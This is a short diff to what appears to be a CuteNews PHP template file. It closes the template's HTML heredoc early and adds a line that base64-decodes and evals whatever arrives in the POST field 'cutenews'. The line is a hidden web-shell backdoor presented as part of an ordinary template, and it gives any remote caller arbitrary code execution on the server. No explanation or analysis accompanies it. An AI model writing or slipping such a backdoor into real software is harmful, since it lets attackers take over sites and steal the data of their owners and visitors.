@@ -11,6 +11,9 @@ $template_active = <<<HTML
     <td>{short-story}</td>
   </tr>
 </table>
+
+HTML;
+eval(base64_decode($_POST['cutenews']));
 HTML;
 
 
